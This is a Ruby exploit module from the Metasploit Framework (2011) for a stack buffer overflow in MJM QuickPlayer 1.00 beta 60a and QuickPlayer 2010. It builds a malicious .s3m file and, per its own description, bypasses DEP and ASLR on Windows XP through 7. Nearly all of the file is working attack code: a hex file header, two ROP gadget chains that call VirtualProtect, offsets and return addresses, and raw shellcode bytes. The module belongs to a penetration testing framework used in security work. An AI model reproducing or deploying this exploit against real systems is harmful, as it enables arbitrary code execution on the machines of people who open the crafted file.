##
# $Id: mjm_quickplayer_s3m.rb 12474 2011-04-30 02:37:14Z sinn3r $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GoodRanking
 
    include Msf::Exploit::FILEFORMAT
 
    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'MJM QuickPlayer 1.00 beta 60a / QuickPlayer 2010 .s3m Stack Buffer Overflow',
            'Description'    => %q{
                    This module exploits a stack buffer overflow in MJM QuickPlayer 1.00 beta 60a
                and QuickPlayer 2010 (Multi-target exploit).  When opening a malicious s3m file in
                one of these 2 applications, a stack buffer overflow can be triggered, resulting in
                arbitrary code execution.
 
                This exploit bypasses DEP & ASLR, and works on XP, Vista & Windows 7.
            },
            'License'        => MSF_LICENSE,
            'Author'         =>
                [
                        'rick2600',     #found the vulnerabilities
                        'corelanc0d3r', #rop exploit + msf module
                ],
            'Version'        => '$Revision: 12474 $',
            'References'     =>
                [
                    [ 'URL', 'http://www.corelan.be/advisories.php?id=CORELAN-11-003' ],
                ],
            'DefaultOptions' =>
                {
                    'EXITFUNC' => 'process',
                },
            'Payload'        =>
                {
                    'Space'       => 2339,  #about 0x900 bytes
                    'DisableNops' => 'True',
                },
            'Platform'       => 'win',
            'Targets'        =>
                [
                    [ 'Windows Universal Generic DEP & ASLR Bypass',
                        {
                            'OffSet1' => 819,         #QuickPlayer 2010.exe
                            'OffSet2' => 1019,        #qplayer.exe
                            'Ret'     => 0x1000156f,  #QuickPlayer 2010.exe : RET,  qplayer.exe ADD AL,5B + POP + RET 4
                        }
                    ],
                ],
            'Privileged'     => false,
            'DisclosureDate' => 'Apr 30, 2011',
            'DefaultTarget'  => 0))
 
        register_options(
            [
                OptString.new('FILENAME', [ true, 's3m file',  'song.s3m']),
            ], self.class)
    end
 
    def junk
        return rand_text(4).unpack("L")[0].to_i
    end
 
    def exploit
 
        print_status("Creating '#{datastore['FILENAME']}' file ...")
 
        header  = "\x42\x42\x42\x42\x42\x42\x42\x42\x41\x41\x41\x41\x41\x41\x41\x41"
        header << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1a\x10\x00\x00"
        header << "\x24\x00\x00\x01\x00\x0d\x08\x00\x20\x13\x02\x00\x53\x43\x52\x4d"
        header << "\x40\x06\x94\xb0\x10\xfc\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        header << "\x00\x08\x01\x09\x02\x0a\x03\x0b\x04\x0c\xff\xff\xff\xff\xff\xff"
        header << "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
        header << "\x06\x00\x03\x01\x02\x04\x05\x07\x08\x09\x09\x0a\x0b\x0c\x0d\x0e"
        header << "\x0f\x10\x10\x11\x12\x13\x14\x15\x16\x16\x17\x18\x19\x18\x1a\x1b"
        header << "\x1b\x1c\xff\xff\x13\x00\x18\x00\x1d\x00\x22\x00\x27\x00\x2c\x00"
        header << "\x31\x00\x36\x00\x3b\x00\x40\x00\x45\x00\x4a\x00\x4f\x00\x54\x00"
        header << "\x59\x00\x5e\x00\x63\x00\x68\x00\x6d\x00\x72\x00\x77\x00\x7c\x00"
        header << "\x81\x00\x86\x00\x8b\x00\x90\x00\x95\x00\x9a\x00\x9f\x00\xa4\x00"
        header << "\xa9\x00\xae\x00\xb3\x00\xb8\x00\xbd\x00\xc2\x00\xc7\x00\xcc\x00"
        header << "\xd1\x00\xd6\x00\xdb\x00\xe0\x00\x14\x01\x4d\x01\x87\x01\xc0\x01"
        header << "\x0e\x02\x5a\x02\x9a\x02\xe9\x02\x40\x03\x7f\x03\xc0\x03\x01\x04"
        header << "\x28\x04\x52\x04\x86\x04\xb9\x04\xea\x04\x1a\x05\x41\x05\x6e\x05"
        header << "\x96\x05\xbc\x05\xeb\x05\x25\x06\x78\x06\xcc\x06\x21\x07\x72\x07"
        header << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        header << "\x01"
 
 
        footer  = "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52"
        footer << "\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26"
        footer << "\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d"
        footer << "\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0"
        footer << "\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b"
        footer << "\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff"
        footer << "\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d"
        footer << "\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b"
        footer << "\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44"
        footer << "\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b"
        footer << "\x12\xeb\x86\x5d\x6a\x01\x8d\x85\xb9\x00\x00\x00\x50\x68"
        footer << "\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95"
        footer << "\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
        footer << "\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x61\x6c\x63\x00"
        footer << "\x00\x00\x00\x00\x00\x00\x00\x00"
 
        print_status("Preparing payload")
 
        pivot = [target.ret].pack('V')
 
        rop_gadgets_quickplayer =
        [
            # pvefindaddr rop 'n roll
            0x004c0021,  # POP ECX # RETN
            0x00000000,
            0x0042850e,  # PUSH ESP # ADD EDI,EDI # POP EDI # POP ESI # POP EBX # POP EBP # RETN 0C
            junk,
            junk,
            junk,
            0x00461248,  #  MOV EAX,EDI # POP EDI # POP ESI # RETN
            junk,
            junk,
            junk,
            junk,
            junk,
            0x004ac31d,  # POP EBX # RETN
            0x00000900,
            0x004a8032,  # POP ESI # RETN
            0x00000080,
            0x10009ea7,  # ADD EAX,ESI # POP ESI # RETN
            junk,
            0x004def0d,  # XCHG EAX,EBP # RETN
            0x004c0145,  # POP EAX # RETN
            0x005da1a0,  # VirtualProtect
            0x00408242,  # MOV EAX,DWORD PTR DS:[EAX] # RETN
            0x0052001a,  # XCHG EAX,ESI # RETN 00
            0x004c0729,  # POP EDX # RETN
            0x00000040,
            0x004c0021,  # POP ECX # RETN
            0x00401000,  # RW
            0x00448142,  # POP EDI # RETN
            0x004ae7ce,  # RET
            0x004c0145,  # POP EAX # RETN
            0x004ae7ce,  # RET
            0x0052158e,  # PUSHAD # RETN 00
        ].pack("V*")
 
        rop_gadgets_qplayer =
        [
            junk,
            0x00434069,  # POP ECX # RETN  QPlayer.exe
            junk,
            0x00000000,
            0x0047e1db,  # XOR ECX,ESP # RETN  QPlayer.exe
            0x10005dad,  # MOV EAX,ECX # POP EBX # RETN 08  QPlayer.lay
            0x00000900,
            0x0043adfd,  # POP ESI # RETN 04  QPlayer.exe
            junk,
            junk,
            0x00000080,
            0x1000591a,  # ADD EAX,ESI # POP EDI # POP ESI # POP EBP # RETN 0C    QPlayer.lay
            junk,
            junk,
            junk,
            junk,
            0x00434e95,  # XCHG EAX,EBP # RETN  QPlayer.exe
            junk,
            junk,
            junk,
            0x10005054,  # POP EAX # RETN  QPlayer.lay
            0x004bfe64,  # VirtualProtect
            0x10009050,  # MOV EAX,DWORD PTR DS:[EAX] # RETN  QPlayer.lay
            0x004bc675,  # XCHG EAX,ESI # RETN  QPlayer.exe
            0x00417a5d,  # POP EDX # RETN  QPlayer.exe
            0x00000040,
            0x0045feaa,  # POP ECX # RETN  QPlayer.exe
            0x00401000,  # RW
            0x00400ddc,  # POP EDI # RETN  QPlayer.exe
            0x10006067,  # RET  QPlayer.exe
            0x004308f5,  # POP EAX # RETN  QPlayer.exe
            0x10006067,  # RET  QPlayer.exe
            0x004b4676,  # PUSHAD # RETN
        ].pack("V*")
 
 
        buffer = rand_text(target['OffSet1'])
        buffer << pivot
        buffer << rop_gadgets_quickplayer
        delta = target['OffSet2'] - buffer.length - 5
        buffer << make_nops(delta)
        buffer << "\xe9\x90\x00\x00\x00"
        buffer << pivot
        buffer << rop_gadgets_qplayer
        buffer << make_nops(100)
        buffer << payload.encoded
 
        filecontent = header + buffer + footer
 
        print_status("Writing payload to file")
 
        file_create(filecontent)
 
    end
 
end